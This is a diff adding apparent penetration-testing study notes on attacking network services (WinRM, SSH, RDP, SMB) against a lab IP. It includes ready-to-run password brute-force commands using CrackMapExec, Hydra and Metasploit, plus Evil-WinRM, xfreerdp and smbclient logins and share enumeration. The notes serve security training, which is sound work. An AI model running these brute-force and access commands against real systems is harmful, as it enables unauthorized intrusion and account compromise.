@@ -175,4 +175,144 @@ locate more tools
 ```
 locate *2john*
 ```
+# Network Services
+
+- During penetration tests, networks have various services to manage, edit, or create content, hosted with specific permissions.
+- Common services include:
+  - **FTP** - **SMB**  - **NFS** - **IMAP/POP3** - **SSH** - **MySQL/MSSQL** - **RDP** - **WinRM** - **VNC** - **Telnet**- **SMTP**- **LDAP**
+
+### Managing Windows Server
+- To manage a Windows server remotely, use services like:
+  - **RDP** (Remote Desktop Protocol)
+  - **WinRM** (Windows Remote Management)
+  - **SSH** (less common on Windows)
+
+- All services typically require authentication (username and password), though they can be configured for key-based access.
+
+### WinRM
+- **Definition:** Windows Remote Management (WinRM) is the Microsoft implementation of the WS-Management protocol.
+- **Protocol Type:** Based on XML web services using SOAP for remote management.
+- **Communication:** Interfaces with WBEM and WMI, can invoke DCOM.
+- **Configuration:** Must be manually activated on Windows 10; depends on security settings in the environment.
+- **Ports Used:** 
+  - **TCP 5985** (HTTP)
+  - **TCP 5986** (HTTPS)
+
+### CrackMapExec
+- **Purpose:** Tool for password attacks, also supports SMB, LDAP, MSSQL, etc.
+- **Installation Command:**  
+  ```bash
+  sudo apt-get -y install crackmapexec
+  ```
+**CrackMapExec Menu Options**
+```
+crackmapexec -h
+```
+
+**CrackMapExec Protocol-Specific Help**
+
+```
+crackmapexec smb -h
+```
+
+**CrackMapExec Usage**
+```
+crackmapexec winrm 10.129.42.197 -u user.list -p password.list`
+```
+![image](https://github.com/user-attachments/assets/970fcdc5-c6e6-4b6a-b643-3f73d912fa8f)
+The appearance of (Pwn3d!) is the sign that we can most likely execute system commands if we log in with the brute-forced user. 
+
+Communicate with the WinRM service is Evil-WinRM
+
+### Evil-WinRM
+
+**Installing Evil-WinRM**
+
+```
+sudo gem install evil-winrm
+```
+**Evil-WinRM Usage**
+
+```
+ evil-winrm -i 10.129.42.197 -u user -p password
+```
+
+### SSH (Secure Shell)
+- **Definition:** A secure method to connect to remote hosts for executing commands or transferring files.
+- **Default Port:** TCP port **22**.
+- **Encryption Methods:**
+  - **Symmetric Encryption:** Same key for encryption and decryption. Requires a key exchange (e.g., Diffie-Hellman). Common ciphers include AES, Blowfish, and 3DES.
+  - **Asymmetric Encryption:** Uses a private key (kept secret) and a public key. The server uses the public key for authentication; the client decrypts messages with the private key.
+  - **Hashing:** Converts transmitted data into a unique value to confirm authenticity.
+
+### Hydra for SSH
+- **Command to brute-force SSH:**
+  ```bash
+  hydra -L user.list -P password.list ssh://10.129.42.197
+  ```
+Login to SSH
+
+```
+ ssh user@10.129.42.197
+```
+### RDP
+- Definition: Microsoft's protocol for remote access to Windows systems.
+- Default Port: TCP port 3389.
+- Features:
+   Allows remote access to Windows hosts.
+   Supports audio, keyboard, mouse input, and document printing.
+   Application layer protocol using TCP and UDP.
+
+**Hydra for RDP**
+```
+hydra -L user.list -P password.list rdp://10.129.42.197
+```
+
+**XFreeRdp**
+
+```
+xfreerdp /v:<target-IP> /u:<username> /p:<password>
+```
+### Server Message Block (SMB)
+
+- **Purpose**: Protocol for transferring data between client and server in local area networks.
+- **Uses**:
+  - File and directory sharing
+  - Printing services in Windows networks
+- **Comparison**: Similar to NFS for Unix/Linux for local network drives.
+- **Also Known As**: Common Internet File System (CIFS).
+- **Compatibility**: Enables remote connections across platforms (Windows, Linux, macOS).
+- **Open Source Implementation**: Samba.
+- **Brute Forcing Tool**: Hydra can be used to attempt different usernames and passwords with SMB.
+
+**Hydra - SMB**
+
+```
+hydra -L user.list -P password.list smb://10.129.42.197
+```
+you may get an error rThis is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile hydra or use another very powerful tool, the Metasploit framework.
+
+**Metasploit Framework**
+
+```
+msfconsole -q
+use auxiliary/scanner/smb/smb_login
+```
+then set the wordlist and for both user and pass to bruteforce.
+
+Now we can use CrackMapExec again to view the available shares and what privileges we have for them.
+
+**CrackMapExec**
+
+```
+crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
+```
+
+use smbclient to communicate
+
+**Smbclient**
+```
+smbclient -U user \\\\10.129.42.197\\SHARENAME
+```
+
 
